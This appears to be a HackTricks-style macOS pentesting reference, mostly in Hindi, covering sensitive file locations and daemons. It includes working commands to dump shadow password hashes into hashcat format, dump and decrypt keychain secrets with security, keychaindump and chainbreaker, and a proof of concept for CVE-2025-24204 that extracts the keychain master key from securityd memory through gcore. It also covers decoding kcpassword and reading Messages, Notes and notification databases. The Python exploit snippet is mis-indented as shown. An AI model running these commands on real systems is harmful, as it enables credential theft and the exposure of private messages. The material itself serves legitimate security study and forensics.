# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Passwords

### Shadow Passwords

Shadow password उपयोगकर्ता की कॉन्फ़िगरेशन के साथ plists में संग्रहीत होता है जो **`/var/db/dslocal/nodes/Default/users/`** में स्थित हैं।\
नीचे दिया गया oneliner उपयोगकर्ताओं के बारे में **सारी जानकारी** (hash जानकारी सहित) निकालने के लिए उपयोग किया जा सकता है:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) का उपयोग hash को **hashcat** **format** में बदलने के लिए किया जा सकता है।

एक वैकल्पिक one-liner जो सभी non-service accounts के creds को hashcat format `-m 7100` (macOS PBKDF2-SHA512) में dump करेगा:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
किसी उपयोगकर्ता का `ShadowHashData` प्राप्त करने का एक और तरीका `dscl` का उपयोग करना है: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

यह फ़ाइल **केवल उपयोग की जाती है** जब सिस्टम **single-user mode** में चल रहा हो (इसलिए बहुत अक्सर नहीं)।

### Keychain Dump

ध्यान दें कि जब आप security binary का उपयोग करके **dump the passwords decrypted** करते हैं, तो इस ऑपरेशन की अनुमति माँगने के लिए कई प्रॉम्प्ट उपयोगकर्ता से अनुरोध करेंगे।
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> इस टिप्पणी के आधार पर [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) ऐसा लगता है कि ये tools अब Big Sur में काम नहीं कर रहे हैं.

### Keychaindump अवलोकन

एक टूल नाम का **keychaindump** macOS keychains से पासवर्ड निकालने के लिए बनाया गया है, लेकिन जैसा कि एक [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) में संकेत दिया गया है, यह Big Sur जैसी नई macOS रिलीज़ में सीमाओं का सामना करता है। **keychaindump** का उपयोग करने के लिए attacker को access हासिल करना और privileges को **root** तक escalate करना ज़रूरी है। यह टूल इस तथ्य का फायदा उठाता है कि सुविधा के लिए keychain user login पर डिफ़ॉल्ट रूप से अनलॉक रहती है, जिससे applications इसे बार-बार user के password की आवश्यकता के बिना access कर सकती हैं। हालांकि, अगर user हर उपयोग के बाद अपना keychain lock करने का विकल्प चुनता है, तो **keychaindump** अप्रभावी हो जाता है।

**Keychaindump** कार्य करता है एक खास process को लक्षित करके जिसे **securityd** कहा जाता है, जिसे Apple authorization और cryptographic operations के लिए एक daemon के रूप में वर्णित करता है, और जो keychain तक पहुँचने के लिए महत्वपूर्ण है। Extraction प्रक्रिया में उस **Master Key** की पहचान शामिल होती है जो user के login password से प्राप्त होती है। यह key keychain file को पढ़ने के लिए आवश्यक है। **Master Key** को ढूँढने के लिए, **keychaindump** `vmmap` command का उपयोग करके **securityd** के memory heap को scan करता है, और `MALLOC_TINY` के रूप में चिह्नित क्षेत्रों में संभावित keys खोजता है। इन memory स्थानों की जाँच के लिए निम्नलिखित command उपयोग किया जाता है:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
संभावित master keys की पहचान करने के बाद, **keychaindump** heaps में एक विशिष्ट पैटर्न (`0x0000000000000018`) के लिए खोज करता है जो master key के उम्मीदवार को इंगित करता है। इस key का उपयोग करने के लिए आगे के कदम, जिनमें deobfuscation शामिल है, आवश्यक हैं, जैसा कि **keychaindump** के source code में दर्शाया गया है। इस क्षेत्र पर काम करने वाले विश्लेषकों को ध्यान देना चाहिए कि keychain को decrypt करने के लिए आवश्यक महत्वपूर्ण डेटा **securityd** process की memory में संग्रहीत होता है। **keychaindump** चलाने का एक उदाहरण कमांड है:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) का उपयोग OSX keychain से निम्न प्रकार की जानकारी फॉरेंसिक रूप से सही तरीके से निकालने के लिए किया जा सकता है:

- Hashed Keychain password — [hashcat](https://hashcat.net/hashcat/) या [John the Ripper](https://www.openwall.com/john/) से crack करने के लिए उपयुक्त
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

यदि keychain unlock password, [volafox](https://github.com/n0fate/volafox) या [volatility](https://github.com/volatilityfoundation/volatility) का उपयोग करके प्राप्त master key, या SystemKey जैसी कोई unlock फ़ाइल उपलब्ध हो, तो Chainbreaker plaintext पासवर्ड भी प्रदान करेगा।

Keychain को अनलॉक करने के इन तरीकों में से किसी एक के बिना, Chainbreaker बाकी सभी उपलब्ध जानकारी दिखाएगा।

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey के साथ keychain keys (पासवर्ड सहित) डंप करें**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (passwords के साथ) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (पासवर्ड के साथ) with memory dump**

[Follow these steps](../index.html#dumping-memory-with-osxpmem) एक **memory dump** करने के लिए
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **users password का उपयोग करके keychain keys (with passwords) को dump करें**

यदि आप users password जानते हैं, तो आप इसका उपयोग करके user के keychains को **dump और decrypt** कर सकते हैं।
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain मास्टर कुंजी `gcore` entitlement के जरिए (CVE-2025-24204)

macOS 15.0 (Sequoia) में `/usr/bin/gcore` को **`com.apple.system-task-ports.read`** entitlement के साथ शिप किया गया था, इसलिए कोई भी local admin (या malicious signed app) **any process memory even with SIP/TCC enforced** को dump कर सकता था। `securityd` को dump करने से **Keychain master key** in clear leaks हो जाती है और यह आपको `login.keychain-db` को बिना user password के decrypt करने देती है।

**कमजोर बिल्ड्स (15.0–15.2) पर Quick repro:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.

### kcpassword

The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\ This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### सूचनाएँ

आप सूचनाओं का डेटा `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` में पा सकते हैं।

अधिकांश उपयोगी जानकारी **blob** में होगी। इसलिए आपको उस सामग्री को **निकालना** और उसे **मानव** **पठनीय** रूप में **रूपांतरित करना** होगा, या **`strings`** का उपयोग करना होगा। इसे एक्सेस करने के लिए आप निम्न कर सकते हैं:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### हाल के प्राइवेसी मुद्दे (NotificationCenter DB)

- macOS **14.7–15.1** में Apple ने banner content को `db2/db` SQLite में proper redaction के बिना स्टोर किया। CVEs **CVE-2024-44292/44293/40838/54504** ने किसी भी local user को सिर्फ DB खोलकर अन्य users के notification text पढ़ने की अनुमति दी (कोई TCC prompt नहीं)। इसे **15.2** में DB को move/lock करके ठीक किया गया; पुराने सिस्टम पर ऊपर दिया गया path अभी भी recent notifications और attachments leak करता है।
- Database केवल प्रभावित बिल्ड्स पर world-readable है, इसलिए legacy endpoints पर hunting करते समय अपडेट करने से पहले इसे कॉपी करें ताकि artefacts सुरक्षित रहें।

### नोट्स

उपयोगकर्ताओं के **notes** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` में पाए जा सकते हैं।
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## प्राथमिकताएँ

In macOS apps preferences are located in **`$HOME/Library/Preferences`** and in iOS they are in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS the cli tool **`defaults`** can be used to **Preferences फ़ाइल को संशोधित करने के लिए**.

**`/usr/sbin/cfprefsd`** claims the XPC services `com.apple.cfprefsd.daemon` and `com.apple.cfprefsd.agent` and can be called to perform actions such as modify preferences.

## OpenDirectory permissions.plist

The file `/System/Library/OpenDirectory/permissions.plist` contains permissions applied on node attributes and is protected by SIP.\
This file grants permissions to specific users by UUID (and not uid) so they are able to access specific sensitive information like `ShadowHashData`, `HeimdalSRPKey` and `KerberosKeys` among others:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## सिस्टम नोटिफिकेशन्स

### Darwin Notifications

नोटिफिकेशन्स के लिए मुख्य daemon है **`/usr/sbin/notifyd`**। नोटिफिकेशन्स प्राप्त करने के लिए, क्लाइंट्स को `com.apple.system.notification_center` Mach पोर्ट के माध्यम से रजिस्टर करना होगा (इन्हें `sudo lsmp -p <pid notifyd>` से चेक करें)। यह daemon फ़ाइल `/etc/notify.conf` के साथ कॉन्फ़िगर किया जा सकता है।

नोटिफिकेशन्स के लिए प्रयुक्त नाम अद्वितीय reverse DNS नोटेशन होते हैं और जब किसी नाम पर नोटिफिकेशन भेजा जाता है, तो उन क्लाइंट(स) को जो संकेत करते हैं कि वे इसे हैंडल कर सकते हैं, वह प्राप्त होगा।

यह संभव है कि वर्तमान स्थिति को dump किया जाए (और सभी नाम देखे जाएँ) notifyd प्रोसेस को SIGUSR2 सिग्नल भेजकर और उत्पन्न फ़ाइल पढ़कर: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center** जिसका मुख्य बाइनरी **`/usr/sbin/distnoted`** है, नोटिफिकेशन भेजने का एक और तरीका है। यह कुछ XPC services को एक्सपोज़ करता है और क्लाइंट्स को सत्यापित करने की कोशिश करने के लिए कुछ चेक करता है।

### Apple Push Notifications (APN)

इस मामले में, applications **topics** के लिए register कर सकती हैं। क्लाइंट Apple के सर्वरों से संपर्क करके **`apsd`** के माध्यम से एक token जनरेट करेगा।  
फिर, providers ने भी एक token जनरेट किया होगा और वे Apple के सर्वरों से कनेक्ट करके क्लाइंट्स को संदेश भेज सकेंगे। ये संदेश लोकली **`apsd`** द्वारा प्राप्त होंगे जो notification को उस application को रिले कर देगा जो उसके लिए प्रतीक्षा कर रही है।

Preferences `/Library/Preferences/com.apple.apsd.plist` में स्थित हैं।

macOS में संदेशों का एक लोकल डेटाबेस `/Library/Application\ Support/ApplePushService/aps.db` में स्थित है और iOS में `/var/mobile/Library/ApplePushService` में। इसमें 3 टेबल हैं: `incoming_messages`, `outgoing_messages` और `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
daemon और connections के बारे में जानकारी प्राप्त करना भी संभव है, निम्नलिखित का उपयोग करके:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## उपयोगकर्ता सूचनाएँ

ये सूचनाएँ हैं जो उपयोगकर्ता को स्क्रीन पर दिखनी चाहिए:

- **`CFUserNotification`**: यह API स्क्रीन पर संदेश के साथ पॉप-अप दिखाने का तरीका प्रदान करती है।
- **The Bulletin Board**: यह iOS में एक banner दिखाता है जो गायब हो जाता है और Notification Center में संग्रहीत हो जाता है।
- **`NSUserNotificationCenter`**: यह MacOS में iOS का bulletin board है। सूचनाओं वाला डेटाबेस /var/folders/<user temp>/0/com.apple.notificationcenter/db2/db में स्थित है।

## संदर्भ

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
